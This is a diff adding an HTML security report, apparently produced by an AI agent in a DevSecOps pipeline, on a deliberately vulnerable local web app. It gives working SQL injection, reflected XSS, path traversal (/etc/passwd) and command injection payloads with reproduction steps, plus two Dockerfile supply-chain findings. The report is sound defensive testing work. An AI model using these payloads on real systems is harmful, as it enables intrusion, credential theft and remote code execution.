@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Exploit Gate - abdellah0x0/agentic-devsecops-pipeline</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f0;
+            color: #2c2c2a;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+        }
+        .container { max-width: 1100px; margin: 0 auto; }
+        .header {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            border: 1px solid #e0e0d8;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .header-left h1 { font-size: 28px; margin-bottom: 8px; }
+        .header-left p { color: #888780; font-size: 14px; }
+        .meta-pill {
+            display: inline-block;
+            background: #f5f5f0;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-family: 'SF Mono', Consolas, monospace;
+            font-size: 12px;
+            margin-right: 4px;
+        }
+        .fix-all-btn {
+            background: #1D9E75;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+        .fix-all-btn:hover { background: #0F6E56; }
+        .fix-all-btn:disabled { background: #888780; cursor: not-allowed; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .stat-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #e0e0d8;
+        }
+        .stat-num { font-size: 36px; font-weight: 600; line-height: 1; }
+        .stat-label { color: #888780; font-size: 13px; margin-top: 8px; text-transform: uppercase; letter-spacing: 0.05em; }
+        .findings-section h2 {
+            font-size: 20px;
+            margin-bottom: 1rem;
+            padding-left: 4px;
+        }
+        .finding-card {
+            background: white;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid #e0e0d8;
+        }
+        .finding-card.exploited {
+            border-left: 4px solid #E24B4A;
+        }
+        .finding-card.safe {
+            border-left: 4px solid #1D9E75;
+            opacity: 0.7;
+        }
+        .finding-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        .severity {
+            padding: 4px 10px;
+            border-radius: 4px;
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .severity.BLOCKER { background: #E24B4A; }
+        .severity.CRITICAL { background: #D85A30; }
+        .severity.MAJOR { background: #EF9F27; }
+        .severity.MINOR { background: #888780; }
+        h3 { font-size: 17px; flex: 1; }
+        .status-badge {
+            font-weight: 600;
+            font-size: 13px;
+            padding: 4px 10px;
+            border-radius: 4px;
+        }
+        .status-badge.exploited { background: #FBE5E4; color: #B23938; }
+        .status-badge.safe { background: #E6F4EE; color: #0F6E56; }
+        .finding-body p { margin-bottom: 8px; line-height: 1.5; font-size: 14px; }
+        .finding-body strong { color: #2c2c2a; }
+        pre {
+            background: #2c2c2a;
+            color: #f5f5f0;
+            padding: 12px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-family: 'SF Mono', Consolas, monospace;
+            font-size: 12px;
+            margin: 8px 0;
+            line-height: 1.4;
+        }
+        code {
+            background: #f5f5f0;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'SF Mono', Consolas, monospace;
+            font-size: 13px;
+            color: #B23938;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 4rem 2rem;
+            color: #888780;
+        }
+        .empty-state h2 { color: #2c2c2a; margin-bottom: 8px; }
+        .footer {
+            text-align: center;
+            color: #888780;
+            font-size: 13px;
+            margin-top: 2rem;
+            padding: 1rem;
+        }
+        .footer a { color: #1D9E75; }
+        @media (max-width: 600px) {
+            .header { flex-direction: column; }
+            .fix-all-btn { width: 100%; justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="header-left">
+                <h1>🛡️ AI Exploit Gate Report</h1>
+                <p>
+                    <span class="meta-pill">abdellah0x0/agentic-devsecops-pipeline</span>
+                    <span class="meta-pill">36ee836</span>
+                    <span class="meta-pill">2026-05-04 07:18 UTC</span>
+                </p>
+            </div>
+            
+        <a href="https://github.com/abdellah0x0/agentic-devsecops-pipeline/issues/new?title=Auto-fix%20all%204%20exploitable%20vulnerabilities&body=%2A%2ACommit%3A%2A%2A%2036ee836%0A%0A%2A%2AVulnerabilities%20to%20fix%3A%2A%2A%204%0A%0AThis%20issue%20was%20created%20from%20the%20AI%20Exploit%20Gate%20dashboard.%0AThe%20AI%20Fix%20Agent%20will%20be%20triggered%20automatically%20by%20the%20%60auto-fix%60%20label.&labels=auto-fix,security" target="_blank" class="fix-all-btn">
+            Generate AI Fix for All Vulnerabilities
+        </a>
+        
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-num">6</div>
+                <div class="stat-label">Total Findings</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num" style="color: #E24B4A">4</div>
+                <div class="stat-label">Exploited</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num" style="color: #888780">0</div>
+                <div class="stat-label">False Positives</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num" style="color: #1D9E75">67%</div>
+                <div class="stat-label">Exploit Rate</div>
+            </div>
+        </div>
+        
+        <div class="findings-section">
+            <h2>Findings Detail</h2>
+            
+    <div class="finding-card exploited">
+        <div class="finding-header">
+            <span class="severity BLOCKER">BLOCKER</span>
+            <h3>SQL Injection</h3>
+            <span class="status-badge exploited">🔴 EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>POST /login</code></p>
+            <p><strong>File:</strong> <code>app/server.js:52</code></p>
+            <p><strong>Rule:</strong> <code>jssecurity:S3649</code> · <strong>CWE:</strong> CWE-89</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>&#39; OR &#39;1&#39;=&#39;1&#39; -- (username field) / UNION: &#39; UNION SELECT 1,&#39;injected_admin&#39;,&#39;cracked_password&#39;,&#39;attacker@evil.com&#39; --</pre>
+            <p><strong>Evidence:</strong> Auth bypass returned admin credentials: {&quot;success&quot;:true,&quot;user&quot;:{&quot;id&quot;:1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin123&quot;,&quot;email&quot;:&quot;admin@vuln.app&quot;},&quot;message&quot;:&quot;Login successful&quot;}. UNION attack injected arbitrary row: {&quot;user&quot;:{&quot;id&quot;:1,&quot;username&quot;:&quot;injected_admin&quot;,&quot;password&quot;:&quot;cracked_password&quot;,&quot;email&quot;:&quot;attacker@evil.com&quot;}}</p>
+            <p><strong>Impact:</strong> Full authentication bypass — attacker can log in as any user without valid credentials. UNION-based injection allows extraction of arbitrary data from the database, including all user credentials.</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Send POST request to http://localhost:3000/login with Content-Type: application/json
+  2. Set body: {&quot;username&quot;:&quot;&#39; OR &#39;1&#39;=&#39;1&#39; --&quot;,&quot;password&quot;:&quot;x&quot;}
+  3. Observe 200 OK response with admin user data and success:true
+  4. Alternatively for data extraction: {&quot;username&quot;:&quot;&#39; UNION SELECT 1,&#39;injected_admin&#39;,&#39;cracked_password&#39;,&#39;attacker@evil.com&#39; --&quot;,&quot;password&quot;:&quot;x&quot;}</pre>
+        
+        </div>
+    </div>
+    
+    <div class="finding-card exploited">
+        <div class="finding-header">
+            <span class="severity BLOCKER">BLOCKER</span>
+            <h3>Reflected Cross-Site Scripting (XSS)</h3>
+            <span class="status-badge exploited">🔴 EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>GET /search</code></p>
+            <p><strong>File:</strong> <code>app/server.js:70</code></p>
+            <p><strong>Rule:</strong> <code>jssecurity:S5131</code> · <strong>CWE:</strong> CWE-79</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>&lt;script&gt;alert(&#39;XSS_CONFIRMED&#39;)&lt;/script&gt;</pre>
+            <p><strong>Evidence:</strong> Response body contained unescaped script tag: &lt;p&gt;You searched for: &lt;script&gt;alert(&#39;XSS_CONFIRMED&#39;)&lt;/script&gt;&lt;/p&gt;. Event handler injection also confirmed: &lt;img src=x onerror=alert(&#39;XSS2&#39;)&gt; reflected verbatim in HTML.</p>
+            <p><strong>Impact:</strong> Reflected XSS allows attacker to execute arbitrary JavaScript in victims&#39; browsers. Attackers can steal session cookies, redirect users, capture keystrokes, or perform actions on behalf of the victim.</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Send GET request to http://localhost:3000/search?q=&lt;script&gt;alert(&#39;XSS_CONFIRMED&#39;)&lt;/script&gt;
+  2. Observe 200 OK response with Content-Type: text/html
+  3. The response body contains the unescaped payload: &lt;p&gt;You searched for: &lt;script&gt;alert(&#39;XSS_CONFIRMED&#39;)&lt;/script&gt;&lt;/p&gt;
+  4. Script executes in victim browser, enabling session hijacking, credential theft, or DOM manipulation</pre>
+        
+        </div>
+    </div>
+    
+    <div class="finding-card exploited">
+        <div class="finding-header">
+            <span class="severity BLOCKER">BLOCKER</span>
+            <h3>Path Traversal</h3>
+            <span class="status-badge exploited">🔴 EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>GET /file</code></p>
+            <p><strong>File:</strong> <code>app/server.js:88</code></p>
+            <p><strong>Rule:</strong> <code>jssecurity:S2083</code> · <strong>CWE:</strong> CWE-22</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>../../../etc/passwd</pre>
+            <p><strong>Evidence:</strong> Full /etc/passwd file returned: root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:... Also confirmed: ../server.js returned full application source code, ../../../etc/hostname returned container ID 385dea80f8c3.</p>
+            <p><strong>Impact:</strong> Arbitrary file read from the server filesystem. Attacker can read sensitive files including /etc/passwd, application source code, configuration files with credentials, private keys, and any file accessible to the process user (appuser uid=1001).</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Send GET request to http://localhost:3000/file?name=../../../etc/passwd
+  2. Observe 200 OK response with Content-Type: text/plain
+  3. Full /etc/passwd file content is returned, revealing all system users
+  4. Additional traversals work: ?name=../server.js (source code), ?name=../../../etc/hostname (container ID)</pre>
+        
+        </div>
+    </div>
+    
+    <div class="finding-card exploited">
+        <div class="finding-header">
+            <span class="severity BLOCKER">BLOCKER</span>
+            <h3>OS Command Injection</h3>
+            <span class="status-badge exploited">🔴 EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>GET /ping</code></p>
+            <p><strong>File:</strong> <code>app/server.js:104</code></p>
+            <p><strong>Rule:</strong> <code>jssecurity:S2076</code> · <strong>CWE:</strong> CWE-78</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>localhost;id</pre>
+            <p><strong>Evidence:</strong> Command output confirmed RCE: &#39;uid=1001(appuser) gid=1001(appuser) groups=1001(appuser),1001(appuser)&#39;. File write confirmed persistent RCE: localhost;echo PWNED_BY_AGENT &gt; /tmp/rce_proof.txt followed by localhost;cat /tmp/rce_proof.txt returned &#39;PWNED_BY_AGENT&#39;. Pipe operator also works: localhost|whoami returned &#39;appuser&#39;.</p>
+            <p><strong>Impact:</strong> Full Remote Code Execution (RCE) as application user (appuser). Attacker can execute arbitrary OS commands, read/write files, establish reverse shells, pivot to internal network, exfiltrate data, or destroy the application environment.</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Send GET request to http://localhost:3000/ping?host=localhost;id
+  2. Observe 200 OK response containing ping output followed by &#39;uid=1001(appuser) gid=1001(appuser)&#39;
+  3. Confirm persistent RCE: GET /ping?host=127.0.0.1;echo%20PWNED_BY_AGENT%20&gt;%20/tmp/rce_proof.txt
+  4. Read the written file: GET /ping?host=127.0.0.1;cat%20/tmp/rce_proof.txt — returns &#39;PWNED_BY_AGENT&#39;</pre>
+        
+        </div>
+    </div>
+    
+    <div class="finding-card safe">
+        <div class="finding-header">
+            <span class="severity MAJOR">MAJOR</span>
+            <h3>Dockerfile: npm install without --ignore-scripts</h3>
+            <span class="status-badge safe">✅ NOT EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>N/A (build-time)</code></p>
+            <p><strong>File:</strong> <code>app/Dockerfile:7</code></p>
+            <p><strong>Rule:</strong> <code>docker:S6505</code> · <strong>CWE:</strong> CWE-78</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>N/A</pre>
+            <p><strong>Evidence:</strong> Build-time configuration issue — not directly exploitable against the running application at http://localhost:3000. The finding is valid: npm install without --ignore-scripts allows malicious packages to execute lifecycle scripts during build.</p>
+            <p><strong>Impact:</strong> Supply chain attack risk during Docker build phase. A compromised npm package could execute arbitrary scripts during image build, potentially stealing secrets, backdooring the image, or exfiltrating build environment credentials.</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Review app/Dockerfile line 7: npm install without --ignore-scripts flag
+  2. A malicious or compromised npm dependency could execute arbitrary scripts at build time
+  3. Supply-chain attack vector: compromise a dependency to run code during CI/CD build</pre>
+        
+        </div>
+    </div>
+    
+    <div class="finding-card safe">
+        <div class="finding-header">
+            <span class="severity MAJOR">MAJOR</span>
+            <h3>Dockerfile: Unpinned npm dependencies</h3>
+            <span class="status-badge safe">✅ NOT EXPLOITED</span>
+        </div>
+        <div class="finding-body">
+            <p><strong>Endpoint:</strong> <code>N/A (build-time)</code></p>
+            <p><strong>File:</strong> <code>app/Dockerfile:7</code></p>
+            <p><strong>Rule:</strong> <code>docker:S8543</code> · <strong>CWE:</strong> CWE-829</p>
+            <p><strong>Payload that worked:</strong></p>
+            <pre>N/A</pre>
+            <p><strong>Evidence:</strong> Build-time configuration issue — not directly exploitable against the running application at http://localhost:3000. Dependencies without locked versions can resolve to different (potentially malicious) versions on each build.</p>
+            <p><strong>Impact:</strong> Non-deterministic builds allow dependency confusion and supply chain attacks. A malicious actor publishing a higher version of a dependency could inject malicious code into future builds.</p>
+            
+        <p><strong>Reproduction:</strong></p>
+        <pre>  1. Review app/Dockerfile line 7: npm install without package-lock.json enforcement or --frozen-lockfile
+  2. Without pinned versions, each build may pull different dependency versions
+  3. An attacker who compromises a package on npm registry could trigger malicious code execution on the next build</pre>
+        
+        </div>
+    </div>
+    
+        </div>
+        
+        <div class="footer">
+            <p>Generated by <strong>Claude Sonnet 4.6</strong> via Agent SDK · 
+            <a href="https://github.com/abdellah0x0/agentic-devsecops-pipeline" target="_blank">View on GitHub</a></p>
+        </div>
+    </div>
+</body>
+</html>
